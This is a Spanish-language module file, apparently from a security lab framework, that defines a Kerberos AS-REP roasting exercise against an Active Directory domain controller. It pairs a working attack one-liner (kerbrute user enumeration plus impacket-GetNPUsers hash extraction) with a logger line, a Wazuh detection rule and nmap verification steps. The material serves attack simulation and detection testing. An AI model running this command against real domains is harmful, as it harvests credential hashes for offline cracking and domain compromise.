# MOD14 — Escalada de Dominio (Kerberos ASREPRoast)
ID: PRIV-002 | MITRE: T1558 | Wazuh Rule: 100513 | Risk: CRITICAL

## Comando (INMUTABLE)
sudo sh -c 'kerbrute userenum --dc {{dc_ip}} -d {{domain}} /usr/share/wordlists/usernames.txt && impacket-GetNPUsers {{domain}}/ -dc-ip {{dc_ip}} -usersfile /usr/share/wordlists/usernames.txt -no-pass -format hashcat'

## Parámetros
| name   | type | default        | required |
|--------|------|----------------|----------|
| dc_ip  | text | ""             | true     |
| domain | text | ""             | true     |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: Kerberos ASREPRoast attack detected against DC {{dc_ip}} domain {{domain}} - MITRE:T1558"

## Regla Wazuh (INMUTABLE)
<rule id="100513" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: Kerberos ASREPRoast</match>
  <description>ALERTA CYBERSHIELD: Ataque Kerberos ASREPRoast (escalada de dominio) detectado</description>
  <mitre><id>T1558</id></mitre>
</rule>

## Nota crítica
Requiere kerbrute e impacket instalados en Kali.
usernames.txt debe prepararse con usuarios válidos del dominio AD.
Sin DC real, el ataque fallará — usar entorno AD de laboratorio.

## Verificación en Kali (ejecutar en paralelo al ataque)
```bash
# Verificar conectividad con el DC
nmap -p 88,389,636 {{dc_ip}} -Pn
# Verificar hashes extraídos
ls -la /tmp/*hashcat* 2>/dev/null
```
